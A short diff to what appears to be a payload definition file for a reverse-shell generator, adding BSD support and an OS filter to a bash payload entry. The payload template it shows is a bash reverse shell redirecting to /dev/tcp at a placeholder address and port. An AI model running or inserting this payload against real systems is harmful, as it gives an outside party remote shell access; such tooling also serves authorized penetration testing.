@@ -70,7 +70,7 @@ payloads:
       cmd_shell: "{VAR:shell}{VAR:minus_i}"
       shell: bash
       shells: ["bash", "zsh"]      # From which shells can it be run?
-      os: ["linux", "mac"]  # On which OS can it be run?
+      os: ["bsd", "linux", "mac"]  # On which OS can it be run?
       commands: ["bash"]           # What commands are required to run?
       encoders: []
       proto: tcp
@@ -84,6 +84,8 @@ payloads:
         values:
           - value: bash
           - value: /bin/bash
+            filters:
+              os: ["linux", "mac"]  # Ensure BSD is removed they use /usr/local/bin/bash
     payload: |-
       {VAR:shell}{VAR:minus_i}>&/dev/tcp/__ADDR__/__PORT__ 0>&1
 #
